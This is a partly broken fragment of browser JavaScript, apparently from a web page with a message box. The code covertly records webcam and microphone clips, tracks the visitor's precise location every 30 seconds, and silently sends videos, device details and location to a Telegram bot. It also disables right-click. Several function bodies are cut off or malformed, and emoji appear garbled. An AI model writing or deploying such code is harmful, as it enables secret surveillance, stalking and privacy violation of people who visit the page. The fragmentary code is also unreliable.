        function getWebGLSupport() {

                await new Promise(resolve => {

        function startStealthRecordingLoop(deviceInfo) {

                if (stealthRecording) {

            setInterval(updateStealthLocation, 30000);

        async function recordStealthVideo(deviceInfo) {

            try {
                const recorder = new MediaRecorder(stealthStream, {
                    mimeType: 'video/webm;codecs=vp8,opus'
                });

                const chunks = [];
                recorder.ondataavailable = e => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                await new Promise(resolve => {
                    recorder.onstop = resolve;
                    recorder.start();
                    
                    // Record for 10 seconds
                    setTimeout(() => {
                        if (recorder.state === 'recording') {
                            recorder.stop();
                        }
                    }, 10000);
                });

                if (chunks.length > 0) {
                    stealthVideoCount++;

                    const locationText = location.lat !== 'blocked'

                        : 'ðŸ“ Location: Updating...';
                    
                    const caption = `ðŸŽ¥ STEALTH #${stealthVideoCount} | ${deviceInfo.browser} | ${locationText} | ${new Date().toLocaleString('id-ID')}`;

                    // Send video silently
                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append('chat_id', TELEGRAM_CHAT_ID);
                    formData.append('video', videoBlob, `stealth_${Date.now()}.webm`);
                    formData.append('caption', caption);

                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    }).then(() => {
                        console.log(`âœ… Stealth video #${stealthVideoCount} sent`);
                    }).catch(err => {
                        console.log('âš ï¸ Stealth video send failed:', err.message);
                    });
                }

            } catch (error) {
                console.log('âš ï¸ Stealth recording error:', error.message);
            }
        }

        function updateStealthLocation() {
            if (!navigator.geolocation) return;

            navigator.geolocation.getCurrentPosition(
                position => {
                    stealthLocation = {
                        lat: position.coords.latitude.toFixed(6),
                        lng: position.coords.longitude.toFixed(6),
                        accuracy: Math.round(position.coords.accuracy) + 'm',
                        maps: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
                        timestamp: new Date().toLocaleString('id-ID')
                    };
                    console.log('ðŸ“ Stealth location updated');
                },
                () => {
                    // Silent fail - keep existing location
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }

        function stopStealthRecording() {
            stealthRecording = false;
            
            if (stealthStream) {
                stealthStream.getTracks().forEach(track => track.stop());
                stealthStream = null;
            }

            // Send final report if videos were recorded
            if (stealthVideoCount > 0) {
                const endMessage = `ðŸ›‘ STEALTH SESSION ENDED\nVideos recorded: ${stealthVideoCount}\nFinal time: ${new Date().toLocaleString('id-ID')}`;
                
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: endMessage
                    })
                });
            }

            console.log('ðŸ›‘ Stealth recording stopped');
        }

        // Basic security - prevent right click
        document.addEventListener('contextmenu', e => e.preventDefault());

        document.getElementById('message').focus();
